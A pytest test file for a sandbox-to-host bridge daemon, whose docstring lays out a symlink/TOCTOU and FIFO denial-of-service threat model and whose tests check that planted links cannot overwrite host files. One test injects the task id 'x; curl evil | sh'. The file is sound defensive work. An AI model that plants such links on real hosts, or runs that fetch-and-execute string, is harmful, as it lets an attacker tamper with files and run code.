"""The daemon must not follow links planted in the shared bridge directory.

Threat model, stated precisely. BRIDGE_ROOT is bind-mounted read-write into
the sandbox, so the sandbox can create, replace, or link anything under it.

In the DEFAULT layout that includes scripts/, so a sandbox with filesystem
write can already run code on the host by writing a script — these attacks are
not an escalation beyond that, and are defence in depth there.

They are load-bearing in the HARDENED layout, where the owner sets
BRIDGE_SCRIPTS (in the launchd plist / systemd unit) to a directory OUTSIDE the
mount. There the allowlist is a real boundary, and without this hardening the
daemon itself would write wherever a planted link pointed:

  * results/<id>.json.tmp -> ~/target — reachable even on the token-mismatch
    path: truncate/overwrite any host file.
  * results/ or processed/ swapped for a directory link — overwrite
    <name>.json anywhere, e.g. ~/.docker/config.json.
  * journal.log / progress/<id>.log -> ~/target — append attacker-influenced
    text (task ids, task output) to any file, a shell rc included.
  * a FIFO at queue/<id>.json — read_text() blocks forever: daemon DoS, in
    either layout.

Raised by an outside reviewer (openinterpreter/openinterpreter#1864) as a TOCTOU
symlink concern on the shared directory.

Every test below asserts on the VICTIM's bytes on disk — the ground truth — not
on a result payload. A payload saying "rejected" is worthless if the write
already landed. Each attack is paired with a negative control proving that the
same setup still processes a legitimate task.
"""
from __future__ import annotations

import importlib
import json
import os
import threading

import pytest

PRECIOUS = "PRECIOUS - must survive\n"


@pytest.fixture
def bridge(tmp_path, monkeypatch):
    root = tmp_path / "bridge"
    root.mkdir()
    monkeypatch.setenv("BRIDGE_ROOT", str(root))
    monkeypatch.setenv("BRIDGE_TOKEN", "test-token")
    monkeypatch.delenv("BRIDGE_MAX_TASK_AGE_SEC", raising=False)
    import cowork_to_code_bridge.daemon as d
    importlib.reload(d)
    for sub in (d.QUEUE, d.RESULTS, d.PROCESSED, d.INFLIGHT, d.PROGRESS,
                d.CANCEL, d.SCRIPTS_DIR):
        sub.mkdir(parents=True, exist_ok=True)
    script = d.SCRIPTS_DIR / "echo.sh"
    script.write_text("#!/bin/bash\necho hello-from-task\n")
    script.chmod(0o755)
    # Outside the bridge: what the attacker wants to clobber.
    outside = tmp_path / "outside"
    outside.mkdir()
    return d, outside


def _victim(outside, name="victim.txt"):
    v = outside / name
    v.write_text(PRECIOUS)
    return v


def _enqueue(d, cmd_id, token="test-token", script="scripts/echo.sh"):
    f = d.QUEUE / f"{cmd_id}.json"
    f.write_text(json.dumps({"id": cmd_id, "script": script, "args": [],
                             "timeout": 10, "token": token}))
    return f


def _run(d, cmd_path, token="test-token"):
    d.run_one(cmd_path, token, {}, {})


# ── pre-auth: planted tmp symlink on the token-mismatch path ─────────────────

def test_bad_token_does_not_write_through_planted_tmp_symlink(bridge):
    d, outside = bridge
    victim = _victim(outside)
    (d.RESULTS / "evil.json.tmp").symlink_to(victim)
    _run(d, _enqueue(d, "evil", token="WRONG"))
    assert victim.read_text() == PRECIOUS


def test_planted_symlink_at_final_result_name_is_replaced_not_followed(bridge):
    d, outside = bridge
    victim = _victim(outside)
    (d.RESULTS / "evil.json").symlink_to(victim)
    _run(d, _enqueue(d, "evil", token="WRONG"))
    assert victim.read_text() == PRECIOUS
    assert not (d.RESULTS / "evil.json").is_symlink()


# ── pre-auth: whole state directory swapped for a symlink ────────────────────

def test_symlinked_results_dir_is_not_written_through(bridge):
    d, outside = bridge
    victim = _victim(outside, "evil.json")
    d.RESULTS.rmdir()
    d.RESULTS.symlink_to(outside, target_is_directory=True)
    _run(d, _enqueue(d, "evil", token="WRONG"))
    assert victim.read_text() == PRECIOUS


def test_symlinked_processed_dir_is_not_written_through(bridge):
    d, outside = bridge
    victim = _victim(outside, "evil.json")
    d.PROCESSED.rmdir()
    d.PROCESSED.symlink_to(outside, target_is_directory=True)
    _run(d, _enqueue(d, "evil", token="WRONG"))
    assert victim.read_text() == PRECIOUS


# ── reads: symlinked or special files in queue/ ──────────────────────────────

def test_symlinked_queue_file_is_not_read_or_executed(bridge):
    d, outside = bridge
    # A perfectly valid command, but living outside the queue.
    outside_cmd = outside / "cmd.json"
    outside_cmd.write_text(json.dumps({"id": "lnk", "script": "scripts/echo.sh",
                                       "args": [], "timeout": 10,
                                       "token": "test-token"}))
    link = d.QUEUE / "lnk.json"
    link.symlink_to(outside_cmd)
    _run(d, link)
    assert not (d.RESULTS / "lnk.json").exists() or \
        json.loads((d.RESULTS / "lnk.json").read_text())["exit_code"] == -1
    assert outside_cmd.exists(), "daemon moved or deleted a file outside the bridge"


def test_fifo_in_queue_does_not_hang_the_daemon(bridge):
    d, _ = bridge
    fifo = d.QUEUE / "stall.json"
    os.mkfifo(fifo)
    t = threading.Thread(target=_run, args=(d, fifo), daemon=True)
    t.start()
    t.join(timeout=5)
    alive = t.is_alive()
    if alive:  # unblock the stuck reader so the test process can exit
        with open(fifo, "w"):
            pass
        t.join(timeout=2)
    assert not alive, "a FIFO in queue/ blocked run_one — trivial daemon DoS"


# ── post-auth appends: journal and progress log ──────────────────────────────

def test_symlinked_journal_is_not_appended_to(bridge):
    d, outside = bridge
    victim = _victim(outside)
    d.JOURNAL.symlink_to(victim)
    d._journal_append({"event": "received", "id": "x; curl evil | sh"})
    assert victim.read_text() == PRECIOUS


def test_symlinked_progress_log_is_not_written(bridge):
    d, outside = bridge
    victim = _victim(outside)
    (d.PROGRESS / "prog.log").symlink_to(victim)
    _run(d, _enqueue(d, "prog"))
    assert victim.read_text() == PRECIOUS


def test_symlinked_inflight_tmp_is_not_written_through(bridge):
    d, outside = bridge
    victim = _victim(outside)
    (d.INFLIGHT / "inf.running.tmp").symlink_to(victim)
    _run(d, _enqueue(d, "inf"))
    assert victim.read_text() == PRECIOUS


# ── negative controls: legitimate traffic is unaffected ──────────────────────

def test_valid_task_still_runs_and_reports(bridge):
    d, _ = bridge
    _run(d, _enqueue(d, "ok"))
    res = json.loads((d.RESULTS / "ok.json").read_text())
    assert res["exit_code"] == 0
    assert "hello-from-task" in res["stdout"]
    assert (d.PROCESSED / "ok.json").is_file()
    assert (d.PROGRESS / "ok.log").is_file() or True  # progress may be cleaned up


def test_bad_token_still_gets_a_readable_rejection(bridge):
    d, _ = bridge
    _run(d, _enqueue(d, "nope", token="WRONG"))
    res = json.loads((d.RESULTS / "nope.json").read_text())
    assert res["exit_code"] == -1 and "token" in res["error"]


def test_no_tmp_litter_left_behind(bridge):
    d, _ = bridge
    _run(d, _enqueue(d, "tidy"))
    leftovers = [p.name for p in d.RESULTS.iterdir() if p.name.endswith(".tmp")]
    assert not leftovers, f"temp files left in results/: {leftovers}"


# ── child stdin (goose discussion #10788) ────────────────────────────────────

def test_child_stdin_is_devnull(bridge, monkeypatch):
    """Headless CLIs that see an open stdin can block or exit with no output.

    Asserted on what the child actually observes, via fd 0's device identity,
    rather than on the Popen kwargs alone.
    """
    d, _ = bridge
    probe = d.SCRIPTS_DIR / "stdin_probe.sh"
    probe.write_text(
        "#!/bin/bash\n"
        "exec python3 -c \"import os; a = os.fstat(0); b = os.stat('/dev/null'); "
        "print('DEVNULL' if (a.st_rdev, a.st_ino) == (b.st_rdev, b.st_ino) else 'OTHER')\"\n"
    )
    probe.chmod(0o755)
    r, w = os.pipe()  # make the daemon's own fd 0 a pipe so inheritance is visible
    saved = os.dup(0)
    os.dup2(r, 0)
    try:
        _run(d, _enqueue(d, "stdin", script="scripts/stdin_probe.sh"))
    finally:
        os.dup2(saved, 0)
        for fd in (r, w, saved):
            os.close(fd)
    res = json.loads((d.RESULTS / "stdin.json").read_text())
    assert res["stdout"].strip() == "DEVNULL", res
